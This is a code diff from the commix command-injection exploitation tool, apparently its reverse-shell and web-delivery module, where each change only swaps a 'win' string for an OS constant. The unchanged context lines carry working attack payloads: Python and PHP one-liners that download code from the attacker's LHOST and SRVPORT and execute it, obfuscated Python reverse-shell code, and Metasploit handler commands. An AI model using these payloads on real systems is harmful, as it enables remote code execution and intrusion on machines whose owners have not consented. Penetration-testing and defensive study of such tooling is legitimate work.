@@ -376,7 +376,7 @@ commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp_other""" + Style.RESET_ALL
               "for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), " \
               "globals(), __import__('contextlib'))"
 
-      if not settings.TARGET_OS == "win":
+      if not settings.TARGET_OS == settings.OS.WINDOWS:
         windows_only_attack_vector()
         continue
       else:
@@ -418,7 +418,7 @@ commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp_other""" + Style.RESET_ALL
                           "set lport " + str(settings.LPORT) + "\n"
                           "exploit\n\n")
 
-        if settings.TARGET_OS == "win" and not settings.USER_DEFINED_PHP_DIR:
+        if settings.TARGET_OS == settings.OS.WINDOWS and not settings.USER_DEFINED_PHP_DIR:
           set_php_working_dir()
           other_shell = settings.WIN_PHP_DIR + " -r " + data
         else:
@@ -462,7 +462,7 @@ commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp_other""" + Style.RESET_ALL
                           "set lport " + str(settings.LPORT) + "\n"
                           "exploit\n\n")
 
-        if settings.TARGET_OS == "win":
+        if settings.TARGET_OS == settings.OS.WINDOWS:
           if not settings.USER_DEFINED_PYTHON_DIR: 
             set_python_working_dir()
           other_shell = settings.WIN_PYTHON_INTERPRETER + " -c " + "\"" + data + "\"" 
@@ -477,7 +477,7 @@ commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp_other""" + Style.RESET_ALL
     
     # Powershell injection attacks
     elif other_shell == '11':
-      if not settings.TARGET_OS == "win":
+      if not settings.TARGET_OS == settings.OS.WINDOWS:
         windows_only_attack_vector()
         continue
       else:
@@ -615,7 +615,7 @@ commix(""" + Style.BRIGHT + Fore.RED + """web_delivery""" + Style.RESET_ALL + ""
 
           if web_delivery == '1':
             data = "import sys%3bimport ssl%3bu%3d__import__('urllib'%2b{2%3a'',3%3a'.request'}[sys.version_info[0]],fromlist%3d('urlopen',))%3br%3du.urlopen('http://" + str(settings.LHOST) + ":" + str(settings.SRVPORT) + settings.URIPATH + "',context%3dssl._create_unverified_context())%3bexec(r.read())%3b"
-            if settings.TARGET_OS == "win":
+            if settings.TARGET_OS == settings.OS.WINDOWS:
               if not settings.USER_DEFINED_PYTHON_DIR: 
                 set_python_working_dir()
               other_shell = settings.WIN_PYTHON_INTERPRETER + " -c " + "\"" + data + "\""
@@ -626,7 +626,7 @@ commix(""" + Style.BRIGHT + Fore.RED + """web_delivery""" + Style.RESET_ALL + ""
             msf_launch_msg(output)
             break
           elif web_delivery == '2':
-            if settings.TARGET_OS == "win" and not settings.USER_DEFINED_PHP_DIR:
+            if settings.TARGET_OS == settings.OS.WINDOWS and not settings.USER_DEFINED_PHP_DIR:
               set_php_working_dir()
               other_shell = settings.WIN_PHP_DIR + " -d allow_url_fopen=true -r eval(file_get_contents('http://" + str(settings.LHOST) + ":" + str(settings.SRVPORT) + settings.URIPATH + "'));"
             else:
@@ -634,7 +634,7 @@ commix(""" + Style.BRIGHT + Fore.RED + """web_delivery""" + Style.RESET_ALL + ""
             msf_launch_msg(output)
             break
           elif web_delivery == '3':
-            if not settings.TARGET_OS == "win":
+            if not settings.TARGET_OS == settings.OS.WINDOWS:
               windows_only_attack_vector()
               continue
             else:
